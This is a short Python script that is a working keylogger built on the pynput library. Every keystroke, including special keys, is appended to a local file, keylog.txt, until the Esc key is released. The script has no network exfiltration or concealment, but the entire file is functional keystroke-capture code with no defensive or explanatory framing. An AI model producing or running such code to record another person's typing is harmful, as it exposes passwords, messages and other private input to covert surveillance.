from pynput.keyboard import Listener, Key

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(" " + str(key) + " ")

def on_release(key):
    if key == Key.esc: 
        return False

def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

main()
